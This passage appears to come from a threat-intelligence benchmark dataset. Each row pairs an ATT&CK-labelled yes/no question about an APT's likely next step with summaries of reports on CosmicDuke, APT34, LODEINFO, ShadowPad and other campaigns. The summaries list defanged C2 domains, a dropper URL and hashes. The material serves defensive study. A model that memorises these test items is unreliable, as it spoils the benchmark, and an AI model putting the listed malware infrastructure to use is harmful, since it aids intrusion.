Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1311,266,266-Command and Control-T1071-Application Layer Protocol,"After leveraging PICKPOCKET, VALUEVAULT, and LONGWATCH malware to extract credentials, is APT34 likely to have TONEDEAF communicate with a C2 server identified as offlineearthquake[.]com to retrieve a sys_id for tracking infected targets?",Command and Control: TONEDEAF communicated with a single C2 server using HTTP GET and POST requests. The C2 domain identified was offlineearthquake[.]com. The malware retrieves the system and current user names to create a 'sys_id' used in subsequent requests to track infected target activity.,"Initial Access: In late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. The campaign involved masquerading as a member of Cambridge University to gain victims' trust to open malicious documents and using LinkedIn to deliver these documents. The targeted employee received a file via a LinkedIn message from 'Rebecca Watts', who claimed to be 'Research Staff at University of Cambridge'. The conversation began with the solicitation of resumes for potential job opportunities.
Execution: The malicious file named System.doc, identified as a new malware family TONEDEAF by FireEye, was a Windows Portable Executable (PE) despite having a 'doc' file extension. TONEDEAF is a backdoor that communicates with a command and control (C2) server using HTTP GET and POST requests, supporting system information collection, file uploading and downloading, and arbitrary shell command execution.
Persistence: The spreadsheet ERFT-Details.xls created a scheduled task named 'windows update check' that runs the file C:\Users\<user_name>\.templates\System Manager.exe every minute. Upon closing the spreadsheet, a final VBA function renames System.doc to System Manager.exe.
Defense Evasion: FireEye's ExploitGuard engine, part of their Endpoint Security, detected and stopped the exploit attempt by Microsoft Excel. The ExploitGuard monitors application behavior for anomalies used by threat actors to subvert traditional detection mechanisms. The offending applications can be sandboxed or terminated, preventing an exploit from reaching its next programmed step.
Credential Access: APT34 added three new malware families to their arsenal, including PICKPOCKET, a malware exclusively observed in use by APT34 for browser credential theft. Additionally, VALUEVAULT, a Golang compiled version of the 'Windows Vault Password Dumper' was used for browser credential theft, and LONGWATCH, a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder.
Others: FireEye's Managed Defense Security Operations Center received an exploit detection alert on June 19, 2019. The Managed Defense SOC analyzed the alert and identified the malicious file System.doc. FireEye's Intelligence and Advanced Practices teams performed a wider search across global visibility, identifying additional artifacts and activity from APT34 actors at other victim organizations. FireEye's platform successfully thwarted the attempted intrusion, stopping the new malware variant. FireEye also initiated a Community Protection Event titled 'Geopolitical Spotlight: Iran' to update customers with new discoveries, activity, and detection efforts related to this campaign and other recent activity from Iranian-nexus threat actors.",Yes,Hard Pass_ Declining APT34’s Invite to Join Their Professional Network
1313,267,267-Command and Control-T1095-Non-Application Layer Protocol,"After redirecting the entry point of the CSMCORE DXE driver to attacker-supplied code in the .reloc section during system startup, is it likely that CosmicStrand will interact with the Transport Device Interface to generate network traffic before retrieving the final payload from update.bokts[.]com?","Command and Control: CosmicStrand sets up a thread notify routine that gets invoked each time a new thread is created. It waits for a thread in winlogon.exe, then tests internet connectivity and interacts with the Transport Device Interface to generate network traffic. It sends specifically crafted UDP or TCP packets to its C2 server, update.bokts[.]com, to retrieve the final payload.","Defense Evasion: CosmicStrand is a sophisticated UEFI firmware rootkit attributed to an unknown Chinese-speaking threat actor. It is designed to achieve durable persistence and stealth, having been used since at least the end of 2016. The rootkit modifies firmware images of Gigabyte or ASUS motherboards with the H81 chipset, suggesting a common vulnerability. The rootkit is introduced into the CSMCORE DXE driver, redirecting the entry point to attacker-supplied code in the .reloc section, which is executed during system startup. This leads to the download and deployment of a malicious component inside Windows. CosmicStrand also attempts to disable PatchGuard, a Windows kernel security mechanism, to avoid detection.
Others: CosmicStrand was discovered by GReAT and reported on by Qihoo360 in 2017. The infection process involves setting up hooks in the boot manager and Windows kernel loader to deploy a kernel-level implant into Windows systems at boot. The rootkit has been used to control victim machines using user-mode components or other undiscovered variants and C2 servers. Victims have been identified in China, Vietnam, Iran, and Russia, primarily private individuals. Code similarities suggest a link to the MyKings botnet and other Chinese-speaking threat actors. Two C2 servers have been identified, with activity periods indicating intermittent exploitation of victim machines. The discovery raises concerns about the potential use of UEFI attacks and the need for the cybersecurity industry to address this blind spot.",Yes,CosmicStrand_ the discovery of a sophisticated UEFI firmware rootkit _ Securelist
1321,268,268-Credential Access-T1649-Steal or Forge Authentication Certificates,"After achieving persistence with a scheduled task named 'Watchmon Service' and a service named 'javamtsup,' is CosmicDuke likely to export certificates and associated private keys from the system store for credential access before searching for files on network and hard drives based on specific patterns for discovery?","Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1322,268,268-Discovery-T1083-File and Directory Discovery,"After achieving persistence by creating a scheduled task and installing the 'Java(TM) Virtual Machine Support Service,' is it likely that CosmicDuke will search for files and target non-English filenames as part of its discovery operations before collecting information using a keylogger, screenshotter, and clipboard stealer?","Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1325,268,268-Collection-T1115-Clipboard Data,"After searching removable drives for files while skipping certain file types in the discovery phase, is it likely that CosmicDuke will use a clipboard stealer to collect data from the clipboard before exfiltrating the collected information to remote servers via FTP?","Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1326,268,268-Collection-T1025-Data from Removable Media,"After CosmicDuke targets files on hard drives and network drives for discovery, is it likely that the malware searches removable drives for files as part of its collection efforts using techniques described under Data from Removable Media?","Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1327,268,268-Exfiltration-T1020-Automated Exfiltration,"After collecting information using a keylogger, screenshotter, and clipboard stealer during the Collection phase, is CosmicDuke likely to automatically upload the collected information to remote servers via FTP using stored login credentials and contact live remote sites during the Exfiltration phase?",Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.,"Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.",Yes,cosmicduke_whitepaper
1329,269,269-Execution-T1106-Native API,"After delivering the LODEINFO malware via spear phishing emails and before ensuring persistence through adding values to the Run registry, is it likely that LODEINFO malware will inject malicious code into a svchost.exe process during Execution using Native API techniques?","Execution: The version RAT malware, developed to run only in a Windows 10 environment, includes remote-controlled functions such as execution of a remote shell, file uploading, and file downloading. LODEINFO malware operates by injecting malicious code into a svchost.exe process and possesses a command set similar to Unix commands.","Initial Access: In September 2019, the Tick group targeted the Chinese offices of Japanese chemical industry organizations using spear phishing emails with an attachment containing the version RAT malware. In December 2019, media companies received spear phishing emails disguised as New Year's greetings, which delivered the LODEINFO malware when the embedded macro was activated. In January 2020, defense-related organizations were targeted with spear phishing emails carrying an Office macro file designed to drop LODEINFO malware.
Persistence: The version RAT malware uses DLL Search Order Hijacking to ensure it is automatically run and remains on the infected device after reboot. LODEINFO malware adds values to the Run registry to ensure it is automatically executed after the infected device is rebooted.
Defense Evasion: The version RAT malware uses a unique technique to identify the OS of the infected device, preventing it from running on any OS other than Windows 10. This technique is effective in circumventing dynamic analysis and sandbox-based security. LODEINFO malware is developed based on benign source code to escape analysis.
Lateral Movement: After confirming communication with the target device via a ping command using the version RAT remote shell, the attacker attempted lateral movement with a net use command.
Command and Control: The version RAT malware uses compromised legitimate websites as C2 servers, with communication data encrypted by AES and base64. LODEINFO malware regularly carries out HTTP POST communication to the C2 server and processes instructions included in the response.
Others: In February 2020, BlackTech's 32bit ELF malware running on Linux OS was uploaded to a public malware repository, indicating a possible victim in the IT service industry. The malware is similar to TsCookie, one of BlackTech's tools. Other tools discovered include a WebShell, a port forwarding tool, a GoogleAPI token updater, and a Linux version of Bifrose malware.",Yes,mpressioncss_ta_report_2019_4_en
1330,269,269-Persistence-T1547-Boot or Logon Autostart Execution,"After targeting organizations with spear phishing emails delivering LODEINFO malware via Office macro files, is it likely that the malware will inject malicious code into the svchost.exe process for execution before adding values to the Run registry for persistence?",Persistence: The version RAT malware uses DLL Search Order Hijacking to ensure it is automatically run and remains on the infected device after reboot. LODEINFO malware adds values to the Run registry to ensure it is automatically executed after the infected device is rebooted.,"Initial Access: In September 2019, the Tick group targeted the Chinese offices of Japanese chemical industry organizations using spear phishing emails with an attachment containing the version RAT malware. In December 2019, media companies received spear phishing emails disguised as New Year's greetings, which delivered the LODEINFO malware when the embedded macro was activated. In January 2020, defense-related organizations were targeted with spear phishing emails carrying an Office macro file designed to drop LODEINFO malware.
Execution: The version RAT malware, developed to run only in a Windows 10 environment, includes remote-controlled functions such as execution of a remote shell, file uploading, and file downloading. LODEINFO malware operates by injecting malicious code into a svchost.exe process and possesses a command set similar to Unix commands.
Defense Evasion: The version RAT malware uses a unique technique to identify the OS of the infected device, preventing it from running on any OS other than Windows 10. This technique is effective in circumventing dynamic analysis and sandbox-based security. LODEINFO malware is developed based on benign source code to escape analysis.
Lateral Movement: After confirming communication with the target device via a ping command using the version RAT remote shell, the attacker attempted lateral movement with a net use command.
Command and Control: The version RAT malware uses compromised legitimate websites as C2 servers, with communication data encrypted by AES and base64. LODEINFO malware regularly carries out HTTP POST communication to the C2 server and processes instructions included in the response.
Others: In February 2020, BlackTech's 32bit ELF malware running on Linux OS was uploaded to a public malware repository, indicating a possible victim in the IT service industry. The malware is similar to TsCookie, one of BlackTech's tools. Other tools discovered include a WebShell, a port forwarding tool, a GoogleAPI token updater, and a Linux version of Bifrose malware.",Yes,mpressioncss_ta_report_2019_4_en
1334,269,269-Command and Control-T1132-Data Encoding,"After achieving lateral movement through the use of the net use command confirmed via ping communication with the target device, is it likely that the version RAT malware will communicate with its Command and Control servers using compromised legitimate websites with communication data encrypted by AES and Base64?","Command and Control: The version RAT malware uses compromised legitimate websites as C2 servers, with communication data encrypted by AES and base64. LODEINFO malware regularly carries out HTTP POST communication to the C2 server and processes instructions included in the response.","Initial Access: In September 2019, the Tick group targeted the Chinese offices of Japanese chemical industry organizations using spear phishing emails with an attachment containing the version RAT malware. In December 2019, media companies received spear phishing emails disguised as New Year's greetings, which delivered the LODEINFO malware when the embedded macro was activated. In January 2020, defense-related organizations were targeted with spear phishing emails carrying an Office macro file designed to drop LODEINFO malware.
Execution: The version RAT malware, developed to run only in a Windows 10 environment, includes remote-controlled functions such as execution of a remote shell, file uploading, and file downloading. LODEINFO malware operates by injecting malicious code into a svchost.exe process and possesses a command set similar to Unix commands.
Persistence: The version RAT malware uses DLL Search Order Hijacking to ensure it is automatically run and remains on the infected device after reboot. LODEINFO malware adds values to the Run registry to ensure it is automatically executed after the infected device is rebooted.
Defense Evasion: The version RAT malware uses a unique technique to identify the OS of the infected device, preventing it from running on any OS other than Windows 10. This technique is effective in circumventing dynamic analysis and sandbox-based security. LODEINFO malware is developed based on benign source code to escape analysis.
Lateral Movement: After confirming communication with the target device via a ping command using the version RAT remote shell, the attacker attempted lateral movement with a net use command.
Others: In February 2020, BlackTech's 32bit ELF malware running on Linux OS was uploaded to a public malware repository, indicating a possible victim in the IT service industry. The malware is similar to TsCookie, one of BlackTech's tools. Other tools discovered include a WebShell, a port forwarding tool, a GoogleAPI token updater, and a Linux version of Bifrose malware.",Yes,mpressioncss_ta_report_2019_4_en
1335,269,269-Command and Control-T1071-Application Layer Protocol,"After attempting lateral movement using a net use command post-confirming communication with the target device via a ping command in the version RAT malware remote shell, is it likely that LODEINFO malware will carry out HTTP POST communication with the C2 server and process instructions included in the response for command and control?","Command and Control: The version RAT malware uses compromised legitimate websites as C2 servers, with communication data encrypted by AES and base64. LODEINFO malware regularly carries out HTTP POST communication to the C2 server and processes instructions included in the response.","Initial Access: In September 2019, the Tick group targeted the Chinese offices of Japanese chemical industry organizations using spear phishing emails with an attachment containing the version RAT malware. In December 2019, media companies received spear phishing emails disguised as New Year's greetings, which delivered the LODEINFO malware when the embedded macro was activated. In January 2020, defense-related organizations were targeted with spear phishing emails carrying an Office macro file designed to drop LODEINFO malware.
Execution: The version RAT malware, developed to run only in a Windows 10 environment, includes remote-controlled functions such as execution of a remote shell, file uploading, and file downloading. LODEINFO malware operates by injecting malicious code into a svchost.exe process and possesses a command set similar to Unix commands.
Persistence: The version RAT malware uses DLL Search Order Hijacking to ensure it is automatically run and remains on the infected device after reboot. LODEINFO malware adds values to the Run registry to ensure it is automatically executed after the infected device is rebooted.
Defense Evasion: The version RAT malware uses a unique technique to identify the OS of the infected device, preventing it from running on any OS other than Windows 10. This technique is effective in circumventing dynamic analysis and sandbox-based security. LODEINFO malware is developed based on benign source code to escape analysis.
Lateral Movement: After confirming communication with the target device via a ping command using the version RAT remote shell, the attacker attempted lateral movement with a net use command.
Others: In February 2020, BlackTech's 32bit ELF malware running on Linux OS was uploaded to a public malware repository, indicating a possible victim in the IT service industry. The malware is similar to TsCookie, one of BlackTech's tools. Other tools discovered include a WebShell, a port forwarding tool, a GoogleAPI token updater, and a Linux version of Bifrose malware.",Yes,mpressioncss_ta_report_2019_4_en
1343,270,270-Persistence-T1053-Scheduled Task/Job,"After exploiting the MS Exchange vulnerability (CVE-2021-26855) to gain initial access and before stealing domain authentication credentials from compromised accounts for lateral movement, is it likely that the attackers would use DLL hijacking to execute ShadowPad and subsequently create persistence using the Windows Task Scheduler?","Persistence: The Windows Task Scheduler was also used for the new ShadowPad version to get a foothold in a system. In total, we managed to find 25 unique modifications.","Initial Access: In mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPad backdoor that affected a number of industrial control systems in Pakistan, specifically engineering computers in building automation systems that are part of a telecom company's infrastructure. A further analysis of the attack revealed other organizations affected by it   The attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as the initial attack vector in several victim organizations. We do not have evidence that CVE-2021-26855 was exploited in all cases of attack identified, but we can assume that the attackers could use this particular vector to penetrate in other cases, as well.
Execution: From March to October 2021, the ShadowPad backdoor was downloaded to victim computers as the mscoree.dll file, which was launched by AppLaunch.exe   Later the attackers launched ShadowPad using DLL hijacking in a legitimate OLE-COM object viewing application (OleView).After the initial infection the attackers first sent commands manually, then automatically.
Credential Access: The artifacts found indicate that the attackers stole domain authentication credentials from at least one account in each attacked organization (probably from the same computer that was used to penetrate the network). These credentials were used to further spread the attack over the network, first manually and then in automatic mode.
Command and Control: The attackers used domains registered with NameSilo, GoDaddy.com and ENOM to communicate with the command-and-control (C2) servers. Most of the C2 servers were hosted on dedicated servers rented from Choopa.
Others: Additional tools used by the attackers included the CobaltStrike framework, which was downloaded to victim machines using the certutil.exe utility, compiled aspx web shells, and procdump and Mimikatz tools; the PlugX backdoor; BAT files (for stealing credentials); Web shells (for remote access to the web server); The Nextnet utility (for scanning network hosts).",Yes,Attacks on industrial control systems using ShadowPad _ Kaspersky ICS CERT
1344,270,270-Credential Access-T1552-Unsecured Credentials,"After exploiting a known vulnerability in MS Exchange, CVE-2021-26855, for initial access to victim organizations' networks, is it likely that the attackers used DLL hijacking to execute the ShadowPad backdoor before stealing domain authentication credentials from a compromised computer?","Credential Access: The artifacts found indicate that the attackers stole domain authentication credentials from at least one account in each attacked organization (probably from the same computer that was used to penetrate the network). These credentials were used to further spread the attack over the network, first manually and then in automatic mode.","Initial Access: In mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPad backdoor that affected a number of industrial control systems in Pakistan, specifically engineering computers in building automation systems that are part of a telecom company's infrastructure. A further analysis of the attack revealed other organizations affected by it   The attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as the initial attack vector in several victim organizations. We do not have evidence that CVE-2021-26855 was exploited in all cases of attack identified, but we can assume that the attackers could use this particular vector to penetrate in other cases, as well.
Execution: From March to October 2021, the ShadowPad backdoor was downloaded to victim computers as the mscoree.dll file, which was launched by AppLaunch.exe   Later the attackers launched ShadowPad using DLL hijacking in a legitimate OLE-COM object viewing application (OleView).After the initial infection the attackers first sent commands manually, then automatically.
Persistence: The Windows Task Scheduler was also used for the new ShadowPad version to get a foothold in a system. In total, we managed to find 25 unique modifications.
Command and Control: The attackers used domains registered with NameSilo, GoDaddy.com and ENOM to communicate with the command-and-control (C2) servers. Most of the C2 servers were hosted on dedicated servers rented from Choopa.
Others: Additional tools used by the attackers included the CobaltStrike framework, which was downloaded to victim machines using the certutil.exe utility, compiled aspx web shells, and procdump and Mimikatz tools; the PlugX backdoor; BAT files (for stealing credentials); Web shells (for remote access to the web server); The Nextnet utility (for scanning network hosts).",Yes,Attacks on industrial control systems using ShadowPad _ Kaspersky ICS CERT
1348,271,271-Defense Evasion-T1564-Hide Artifacts,Is it likely that traffers will gain initial access to high-profile ad networks such as DoubleClick or Bing Ads before using stolen registration credentials for domain shadowing to evade defenses?,"Defense Evasion: The report describes a technique called 'domain shadowing' where malicious subdomains are generated from a legitimate domain using stolen registration credentials. This allows the threat actor to configure servers on the fraudulent subdomain to perform filtering and redirection actions that pull in their preferred exploit kit, such as Angler EK.","Initial Access: The CTI report indicates that threat actors, referred to as 'traffers', aim to gain access to high-profile ad networks such as DoubleClick, Bing Ads, AdTech, or AppNexus to distribute malvertising. The traffers leverage reputable ad networks to access higher-quality traffic and reach their target audience more effectively.
Others: The CTI report by Proofpoint Staff, dated Tuesday, December 15, 2015, details a malvertising campaign that utilizes domain shadowing to distribute Angler Exploit Kit (Angler EK). The campaign involves creating fraudulent subdomains, such as ads.mikeholt[.]com, under legitimate domains using stolen credentials. The malicious ad server includes filtering settings to serve harmless ad code to non-targeted clients. Targeted clients, however, are subjected to a multi-step attack that involves filtering proxied traffic, decoding a bogus GIF, and leveraging information disclosure bugs in Internet Explorer to avoid detection by researchers and security products. The attack abuses an HTTPS open redirect by DoubleClick and lands the browser on Angler EK without a referrer. The Bedep malware, specifically 'buildId' 1926, was observed loading various malware payloads, including Fileless Ursnif, Ramnit, Blowcrypt, Vawtrak campaigns 13 and 60, and Reactor Bot. The report concludes that malvertising remains an effective malware distribution method due to the evolving techniques of threat actors. Indicators of Compromise (IOCs) and ET signatures related to the campaign are provided.",Yes,The-Shadow-Knows
